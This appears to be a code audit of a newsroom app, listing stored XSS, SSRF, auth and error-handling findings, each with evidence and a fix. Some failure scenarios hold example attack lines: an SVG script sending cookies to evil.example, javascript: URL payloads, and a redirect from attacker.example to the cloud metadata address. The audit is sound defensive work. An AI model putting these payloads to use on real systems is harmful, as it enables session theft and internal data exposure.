title: Article bodyHtml is stored raw on POST/PUT; sanitizeArticleHtml exists for exactly this threat but is only wired into the import route
evidence: bodyHtml: z.string().nullish(),  // CreateArticleSchema, then `bodyHtml: bodyHtml || null,` in prisma.article.create — no sanitize call anywhere in this file or in [id]/route.ts. Meanwhile src/lib/html-sanitize.ts:3-6 states the intent: 'Writers (or AI output via prompt injection) can post `bodyHtml` directly via the API; without server-side sanitization, stored XSS is possible the moment the body is rendered or previewed by another editor/admin.' Grep confirms sanitizeArticleHtml is called only from src/app/api/articles/import/route.ts:217.
failure_scenario: A WRITER-role user PUTs /api/articles/<id> with bodyHtml containing `<script>fetch('/api/users').then(...)</script>` or `<iframe src="https://evil.example">` -> stored verbatim in articles.body_html -> publishArticle() pushes it to WordPress properties where it executes for public readers, and any editor previewing raw HTML is exposed.
fix: In src/app/api/articles/route.ts POST and src/app/api/articles/[id]/route.ts PUT, run bodyHtml through sanitizeArticleHtml() from src/lib/html-sanitize.ts before writing updateData.bodyHtml / create data.

title: SSRF check is bypassable via HTTP redirect: isPrivateUrl is only applied to the original URL, then fetch() follows redirects
evidence: if (isPrivateUrl(url)) { ... 400 } ... const articleResponse = await fetch(url, { headers: {...}, signal: AbortSignal.timeout(15000) });  // no redirect: 'manual', no re-validation
failure_scenario: Admin submits https://attacker.example/redirect which 302s to http://169.254.169.254/latest/meta-data or http://10.0.0.33:8123/api/states -> isPrivateUrl passes on the public URL, fetch follows the redirect, internal response body is fed to trafilatura/regex extraction and to the Anthropic prompt, exfiltrating internal content into the generated draft.
fix: In src/app/api/articles/import/route.ts fetch with redirect: 'manual', and for each redirect response re-validate the Location URL with isPrivateUrl before following (bounded hop count).

title: Exemplar scrape fetches an arbitrary user-supplied URL with no SSRF guard at all
evidence: const fetchRes = await fetch(normalizedUrl, { signal: controller, headers: { 'User-Agent': 'Mozilla/5.0 ...' } });  // no isPrivateUrl import or call anywhere in this file; redirects followed by default
failure_scenario: An EDITOR or ADMIN submits url=http://10.0.0.33:8123/api/states or a redirector to a private IP -> server fetches the internal resource, extracts its text, stores it in articleExemplar.rawContent, and serves it back to any authenticated user via GET /api/exemplars — an internal-network read primitive.
fix: Import isPrivateUrl from src/lib/url-validation.ts and reject private URLs before fetch (and handle redirects as in SEC-02) in src/app/api/exemplars/route.ts POST.

title: isPrivateUrl matches only the hostname string against IP patterns; it never resolves DNS, so a public hostname pointing at a private IP passes
evidence: const hostname = url.hostname; for (const pattern of PRIVATE_IP_RANGES) { if (pattern.test(hostname)) return true; } if (hostname === 'localhost' || hostname === '[::1]') return true; ... return false;  // no dns.lookup anywhere
failure_scenario: Attacker controls evil.example with an A record of 10.0.0.33 (or uses a rebind service) -> isPrivateUrl('http://evil.example/') returns false -> import route and publish.ts image download (publish.ts:195) fetch the internal target. DNS rebinding also defeats any resolve-once-then-fetch fix unless the resolved IP is pinned.
fix: In src/lib/url-validation.ts add an async variant that resolves the hostname (dns.promises.lookup with verbatim:true) and rejects if any resolved address is private; call it from the import route and from downloadImage in src/lib/publish.ts:195, ideally re-validating after redirects.

title: SVG uploads are accepted into Drive and then served inline from the app origin with Content-Type image/svg+xml — stored XSS via direct navigation
evidence: const ALLOWED_TYPES = [ 'image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/svg+xml' ];  // upload route. Then src/app/api/drive-images/[id]/raw/route.ts:74-81 serves `new NextResponse(buffer, { headers: { 'Content-Type': mimeType, 'Cache-Control': 'public, max-age=86400...', 'X-Content-Type-Options': 'nosniff' } })` where mimeType comes from Drive metadata and passes the `mimeType.startsWith('image/')` gate for SVG.
failure_scenario: Any authenticated user (WRITER included) uploads evil.svg containing <script>document.location='https://evil.example/?c='+document.cookie</script> -> file lands in the shared Drive folder -> an admin who opens https://newsroom.m3media.com/api/drive-images/<id>/raw directly executes the script on the newsroom origin. Note src/lib/media.ts:47 deliberately excludes SVG with the comment 'SVG intentionally excluded — same-origin stored XSS risk', so the two upload paths have diverged on a documented decision.
fix: Remove 'image/svg+xml' from ALLOWED_TYPES in src/app/api/drive-images/upload/route.ts and in src/lib/drive.ts ALLOWED_MIME_TYPES (or serve SVG with Content-Disposition: attachment / Content-Type: text/plain in the raw route).

title: Deactivated users keep full access until their JWT expires (up to 14 days); isActive is only checked at login
evidence: async jwt({ token, user }) { if (user) { token.id = user.id; token.role = user.role; ... } return token; },  // no re-check of isActive on subsequent requests; session: { strategy: 'jwt', maxAge: 14 * 24 * 60 * 60 }
failure_scenario: Admin sets isActive=false on a writer (PATCH /api/users) -> the writer's already-issued JWT remains valid for up to 14 days and every API route (which only checks getServerSession) keeps serving and accepting writes from the deactivated account.
fix: In src/lib/auth.ts jwt or session callback, re-load the user's isActive/role from prisma (or a short-TTL cache) and return an empty/invalid token when deactivated or when role changed; alternatively shorten maxAge and add a per-request check in middleware.

title: Getty download triggers AI analysis with the wrong secret (NEXTAUTH_SECRET vs INTERNAL_API_SECRET), so analysis always 401s — and the failure is silently swallowed
evidence: fetch(`${baseUrl}/api/media/${media.id}/analyze`, { method: 'POST', headers: { 'x-internal-secret': process.env.NEXTAUTH_SECRET || '' }, }).catch(() => {});  // while src/app/api/media/[id]/analyze/route.ts:13 checks `authHeader !== process.env.INTERNAL_API_SECRET`. A 401 response resolves the fetch promise normally, so .catch never even fires.
failure_scenario: Every Getty image downloaded through this route -> analyze call returns 401 Unauthorized -> image stays aiStatus='pending' forever -> AI tagging silently never happens for Getty-sourced media, with zero log lines anywhere.
fix: In src/app/api/getty/download/route.ts use process.env.INTERNAL_API_SECRET to match media/upload/route.ts:71, and check response.ok, logging status + body on failure instead of `.catch(() => {})`.

title: analyze-backfill authenticates with NEXTAUTH_SECRET while the sibling analyze route uses INTERNAL_API_SECRET — the session-signing secret doubles as an API credential
evidence: if (authHeader !== process.env.NEXTAUTH_SECRET) { return NextResponse.json({ error: 'Unauthorized' }, { status: 401 }); }  // compare media/[id]/analyze/route.ts:13 `authHeader !== process.env.INTERNAL_API_SECRET`; also non-timing-safe !== comparison
failure_scenario: Anyone who learns the JWT signing secret (log leak, repo leak) can not only forge sessions but also invoke this expensive backfill endpoint; and an operator rotating INTERNAL_API_SECRET silently breaks backfill auth while getty/download (SEC-07) breaks the other way — three routes, two secrets, no single convention.
fix: Standardize all internal endpoints on INTERNAL_API_SECRET verified with timingSafeCompare from src/lib/auth-utils.ts; update analyze-backfill/route.ts and getty/download/route.ts.

title: SCANNER_API_KEY compared with plain === instead of the repo's own timingSafeCompare
evidence: const auth = request.headers.get('authorization') ?? ''; return auth === `Bearer ${key}`;  // duplicated verbatim in src/app/api/scanner/feedback-export/route.ts:8
failure_scenario: Remote timing measurement on the 401/201 boundary can theoretically recover the Bearer key character-by-character (low practical risk over the internet, but the repo already has verifyBearerToken in src/lib/auth-utils.ts used by cron routes — inconsistent application).
fix: Replace authOk() in both scanner routes with verifyBearerToken(request.headers.get('authorization'), process.env.SCANNER_API_KEY).

title: The '/api/auth' rate limit (10 req/min/IP) also covers NextAuth's /api/auth/session and /api/auth/csrf GETs, locking out real users behind shared IPs
evidence: '/api/auth': { max: 10, windowMs: 60_000 },  // applied via `if (pathname.startsWith(route))` at line 120, before any auth logic, to every /api/auth/* request including session polling
failure_scenario: Several editors behind one office NAT each keep a dashboard open; NextAuth client polls /api/auth/session on focus/interval -> the 11th request in a minute from that IP gets 429 -> useSession() sees an error and the UI can bounce users to /login or fail credential callbacks (login posts share the same bucket, so a locked-out user also cannot log back in for the window).
fix: In src/middleware.ts scope the auth rate limit to credential-attempt paths only (e.g. pathname === '/api/auth/callback/credentials' or POSTs to /api/auth/signin), not the whole /api/auth prefix.

title: Rate limiter keys on spoofable x-forwarded-for and trusts the first hop blindly
evidence: const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
failure_scenario: An attacker sending rotating X-Forwarded-For values gets a fresh 10-or-30-request bucket per request -> rate limit on /api/auth and /api/articles/search is effectively disabled; conversely a shared proxy collapses many users into one bucket (SEC-10).
fix: Behind Caddy, trust only the rightmost X-Forwarded-For entry appended by the proxy (or use req.ip where available); document the proxy contract in src/middleware.ts.

title: Trending webhook payload's url field is stored verbatim and rendered as an anchor href in the dashboard — javascript:/data: URL XSS
evidence: const rawUrl = String(t.url || ''); const url = rawUrl || `https://x.com/search?q=${encodeURIComponent(name)}`;  // no scheme validation. Rendered at src/components/dashboard/TrendingTopics.tsx:115: `href={trend.url}`
failure_scenario: The n8n pipeline (or anything that compromises its TRENDING_API_KEY or upstream trend data) posts trends:[{name:'x', url:'javascript:alert(document.cookie)'}] -> stored in /tmp/newsroom-data/trending.json, served to every authenticated dashboard user for up to a minute cache + file persistence -> a click executes script on the newsroom origin.
fix: In src/app/api/trending/route.ts validate rawUrl with `new URL()` and reject anything whose protocol is not http: or https:, falling back to the x.com/search URL.

title: PickSchema accepts any URL scheme (z.string().url() parses javascript:) and pick URLs are rendered as links in the admin scanner UI
evidence: url: z.string().url(),  // in PickSchema; zod's .url() only requires successful `new URL()` parsing, which accepts javascript: and data:
failure_scenario: Anything holding SCANNER_API_KEY (or a compromised upstream scraper) ingests a pick with url='javascript:...' -> admin reviewing picks clicks the story link -> script executes in the admin session.
fix: Add .refine() on the url field restricting to http/https, e.g. z.string().url().refine(u => /^https?:/.test(u)).

title: Drive raw proxy fetches any file ID the service account can read (scope drive.readonly), not just files in the images folder
evidence: scopes: ['https://www.googleapis.com/auth/drive.readonly'], ... drive.files.get({ fileId, fields: 'mimeType', supportsAllDrives: true })  // isValidFileId only checks /^[a-zA-Z0-9_-]{10,100}$/; no parent-folder check
failure_scenario: Any authenticated user who learns a Drive file ID of any image/* file shared with the service account (other folders, other projects' shared drives) can exfiltrate it through this proxy, bypassing Drive-level sharing UI; results are also cached public for 24h (Cache-Control at line 78) on any CDN in front.
fix: In the raw route, also request `parents` in fields and verify GOOGLE_DRIVE_FOLDER_ID is among them (or list-check), before streaming.

title: Sites list leaks the first 8 characters of the Shopify clientId to any ADMIN caller
evidence: clientId: s.clientId ? s.clientId.substring(0, 8) + '...' : null,
failure_scenario: Partial credential disclosure in API responses (clientId is the less sensitive half of the Shopify pair, but 8 chars of it aids phishing/social engineering); inconsistent with the full masking applied to apiKey/password/clientSecret.
fix: Mask clientId the same way: s.clientId ? '••••••••' : null in src/app/api/sites/route.ts GET.

title: Timing-attack dummy hash '$2a$12$dummy.hash.to.prevent.timing.attacks' is not a valid bcrypt hash, so the equalization compare short-circuits
evidence: await bcrypt.compare(credentials.password, '$2a$12$dummy.hash.to.prevent.timing.attacks');  // comment says 'Use constant-time comparison to prevent timing attacks'
failure_scenario: bcryptjs detects the malformed salt/hash and returns false without performing the full 12-round derivation -> the unknown-user path is measurably faster than the wrong-password path -> account-existence timing oracle on the login endpoint (small but the code explicitly claims to prevent it).
fix: Replace the dummy string with a real precomputed bcrypt hash of a random password (e.g. the output of bcrypt.hashSync('dummy', 12)) in src/lib/auth.ts.

title: Review record creation and article status update are not transactional — a failure between them leaves a Review row against an article still in SUBMITTED
evidence: await prisma.review.create({ data: { articleId: params.id, reviewerId: session.user.id, decision: decision as string, notes } });  // then separately: const updated = await prisma.article.update({ where: { id: params.id }, data: { status: statusMap[decision as string] }, ... });
failure_scenario: review.create succeeds, then article.update throws (DB hiccup, record deleted concurrently) -> the article stays SUBMITTED/IN_REVIEW but a Review row says 'approved' -> a second editor reviews it again, creating duplicate Review rows and double decision emails.
fix: Wrap review.create + article.update in prisma.$transaction([...]) in src/app/api/articles/[id]/review/route.ts.

title: WordPress ACF SEO metadata write failures are swallowed with .catch(() => {}) and no log
evidence: setWordPressAcfSeo(data.id, auth, target.url, seo.description, seo.keywords).catch(() => {});
failure_scenario: The ACF SEO call fails (auth expired, ACF endpoint 404, network) -> article publishes without SEO description/keywords -> editors believe SEO metadata shipped; no log line exists to diagnose why rankings/meta are missing. Directly violates the project's named 'preserve error evidence' constraint.
fix: Change to .catch((err) => console.error('[Publish] ACF SEO write failed for post', data.id, err?.status, err?.message)) in src/lib/publish.ts.

title: Media usage-count increment/decrement failures are swallowed silently, so usageCount drifts from reality
evidence: if (oldMediaId) decrementUsageCount(oldMediaId).catch(() => {}); if (newMediaId) incrementUsageCount(newMediaId).catch(() => {});
failure_scenario: DB error during either call -> count silently wrong -> a later cleanup flow that trusts usageCount (delete-when-zero) either orphans files or, worse, deletes media still referenced by an article. No log exists to reconcile the drift.
fix: Log inside the catch: .catch((err) => console.error('[Articles PUT] usage count update failed', { oldMediaId, newMediaId, err })).

title: R2 object deletion failure is swallowed with .catch(() => {}) — orphaned R2 objects accumulate invisibly
evidence: await client.send(new DeleteObjectCommand({ Bucket: R2_BUCKET, Key: key })).catch(() => {});
failure_scenario: deleteMedia removes the DB row and disk file but the R2 delete fails (credentials, network) -> object lives forever in the bucket, still publicly fetchable if the bucket is public, and storage cost grows with no trace.
fix: Log the failure with the key: .catch((err) => console.error('[Media] R2 delete failed for', key, err)) in src/lib/media.ts deleteFromR2.

title: request.json() is called with no try/catch in publish POST (and import POST), so a malformed body produces an unhandled 500
evidence: const body = await request.json();  // publish route line 40; same pattern at src/app/api/articles/import/route.ts:25 `const { url } = await request.json();` outside its try block; also targetIds elements are never type-checked (body.targetIds || ...) so a non-string element flows into publishArticle
failure_scenario: Client posts invalid JSON to /api/articles/<id>/publish -> Next.js default error page/500 instead of a clean 400; a body of {targetIds:[123]} reaches publishArticle with a numeric id and fails deep inside publish.ts with a confusing error.
fix: Wrap body parsing in try/catch returning 400, and validate targetIds is an array of strings (zod, as done in cuts routes) in both routes.

title: Version numbering has a read-then-write race: concurrent saves compute the same nextVersion and one INSERT fails with a unique violation
evidence: const lastVersion = article.versions[0]?.version || 0; const nextVersion = lastVersion + 1;  // then prisma.articleVersion.create({ data: { articleId: params.id, version: nextVersion, ... } })
failure_scenario: Two editor tabs (or autosave + manual save) POST a version simultaneously -> both read lastVersion=N -> both insert version N+1 -> second create throws P2002 -> the route's catch returns a generic 500 'Failed to create version' and one save's snapshot is lost.
fix: In src/app/api/articles/[id]/versions/route.ts either retry once on P2002 with a recomputed version, or serialize via a transaction with SELECT ... FOR UPDATE.

title: PATCH /api/users lacks the length validation POST has — oversized name/email hits the DB and 500s
evidence: if (typeof name === 'string' && name.trim()) updateData.name = name.trim(); if (typeof email === 'string' && email.trim()) updateData.email = email.toLowerCase().trim();  // compare POST lines 78-81: name length 255 check, isValidEmail check
failure_scenario: Admin PATCHes a 500-char name or a malformed email -> prisma throws a constraint/validation error -> generic 500 (or, worse, an invalid email is stored that later breaks sendEmail to that user).
fix: Mirror POST's validation in PATCH: name.trim().length <= 255 and isValidEmail() for email updates in src/app/api/users/route.ts.

title: Tag replacement runs in its own transaction separate from the article update — tags can change while the article update fails
evidence: await prisma.$transaction(async (tx) => { await tx.articleTag.deleteMany(...); ... });  // then, outside it: const updated = await prisma.article.update({ where: { id: params.id }, data: updateData, ... });
failure_scenario: Tag transaction commits, then article.update throws (e.g. scheduledPublishAt edge) -> client sees an error and retries, but tags were already replaced — the article's tags no longer match what the editor had on screen, with no indication.
fix: Move the tag delete/upsert/createMany into the same $transaction as the article.update in src/app/api/articles/[id]/route.ts PUT.

title: Search fallback's inner catch swallows the error with no log
evidence: } catch { return NextResponse.json({ error: 'Search failed' }, { status: 500 }); }
failure_scenario: Full-text search throws (logged), then the ILIKE fallback also throws (e.g. DB down) -> the second failure is invisible: operators see one error line for the outer failure and cannot tell the fallback also failed or why.
fix: Change to catch (fallbackErr) { console.error('Search fallback error:', fallbackErr); ... } in src/app/api/articles/search/route.ts.

title: fetchSourceText silently returns '' on any fetch failure — spotlight drafts get written from empty source text with no error recorded
evidence: } catch { return ''; }  // after `if (!res.ok) return '';` — neither path logs status or URL; same silent pattern at line 163-165 `} catch { // fall through to crude extraction }
failure_scenario: Source site 403s or times out -> fetchSourceText returns '' -> the Anthropic draft is generated from just the headline with no source material (fabrication risk on a published draft) and nothing in logs or the run record says the fetch failed.
fix: Log url + status/exception before returning '' in src/lib/conservative-spotlight-runner.ts fetchSourceText, and consider marking the draft's aiReviewFindings with sourceFetchFailed:true.

title: media/upload advertises SVG as allowed but saveMedia rejects it — SVG uploads die with a 500 instead of a clean 400
evidence: const ALLOWED_TYPES = [ 'image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/svg+xml' ];  // route level, but src/lib/media.ts:48-53 ALLOWED_MIME_TYPES deliberately excludes SVG ('SVG intentionally excluded — same-origin stored XSS risk') and saveMedia throws `Invalid mime type: image/svg+xml`
failure_scenario: User uploads an SVG through the media library -> passes route validation -> saveMedia throws -> safeErrorResponse returns 500 with the 'invalid'-pattern message; the client shows a server error for what is really a validation rejection, and the two allowlists drift further apart over time.
fix: Remove 'image/svg+xml' from ALLOWED_TYPES in src/app/api/media/upload/route.ts (and from the error message at line 36) to match src/lib/media.ts.

title: Middleware protectedPaths omits /scanner — the scanner page shell loads unauthenticated (APIs behind it are admin-gated, but the page is reachable)
evidence: const protectedPaths = ['/', '/dashboard', '/editor', '/admin', '/analytics'];
failure_scenario: Unauthenticated visitor opens /scanner -> page HTML/JS bundle downloads (no data, since /api/scanner/* returns 401) -> information disclosure limited to the client bundle and route existence, plus inconsistent UX (page renders then errors) rather than a redirect to /login.
fix: Add '/scanner' (and any other authenticated shells such as '/exemplars' if present) to protectedPaths in src/middleware.ts.
